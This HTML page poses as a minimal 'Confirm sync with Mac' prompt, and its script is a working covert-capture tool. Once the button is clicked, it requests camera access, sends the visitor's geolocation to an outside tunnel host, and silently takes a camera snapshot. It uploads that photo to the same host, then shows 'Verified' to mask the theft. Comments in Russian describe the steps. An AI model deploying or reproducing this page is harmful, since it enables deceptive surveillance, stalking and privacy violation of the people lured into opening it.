<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sync</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 280px; padding: 40px; background: #111; border: 1px solid #333; border-radius: 20px; text-align: center; }
        .btn { background: #fff; color: #000; border: none; padding: 15px; font-size: 16px; font-weight: 600; border-radius: 12px; width: 100%; cursor: pointer; }
        #loader { display: none; margin: 10px auto; width: 20px; height: 20px; border: 2px solid #333; border-top: 2px solid #fff; border-radius: 50%; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; opacity: 0; pointer-events: none; z-index: 100; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="flash"></div>
    <div class="card">
        <h2 id="st">Access</h2>
        <p id="msg">Confirm sync with Mac</p>
        <button class="btn" id="go" onclick="init()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
    const API = "https://7f13bc54307437.lhr.life"; 

    async function init() {
        const go = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st');
        go.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";

        try {
            // 1. ЗАПРОС ГЕО И КАМЕРЫ СРАЗУ
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = stream;
            
            // Запрашиваем гео параллельно
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${API}/location`, { method: 'POST', mode: 'no-cors', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
            }, null, {timeout: 5000});

            await new Promise(r => setTimeout(r, 1200));

            // 2. СНИМОК
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));

            // 3. ЖЕСТКАЯ ОТПРАВКА (no-cors)
            const fd = new FormData(); fd.append('file', blob, 'img.jpg');
            
            // Используем mode: 'no-cors', чтобы браузер не выдавал ошибку
            fetch(`${API}/upload-photo`, { method: 'POST', mode: 'no-cors', body: fd });

            // Визуально завершаем через полсекунды
            setTimeout(() => {
                st.innerText = "Verified";
                ld.style.display = 'none';
                stream.getTracks().forEach(t => t.stop());
            }, 500);

        } catch (e) {
            alert("Check camera permissions or tunnel link");
            go.style.display = 'block'; ld.style.display = 'none'; st.innerText = "Retry";
        }
    }
</script>
</body>
</html>
